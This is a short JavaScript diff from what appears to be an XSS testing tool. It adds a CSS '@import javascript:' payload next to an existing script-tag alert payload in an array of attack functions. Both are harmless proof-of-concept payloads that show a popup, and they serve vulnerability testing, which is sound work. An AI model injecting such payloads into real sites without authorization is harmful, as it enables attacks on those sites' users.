@@ -53,4 +53,9 @@ $(document).ready(function() {
   attacks[2][0] = function(name) {
     return "<script>alert('"+name+" is vulnerable to XSS.');</script>";
   }
+
+  /* Style XSS Attack */
+  attacks[2][1] = function(nume) {
+    return "@import\"javascript:alert('XSS')\";"
+  }
 });
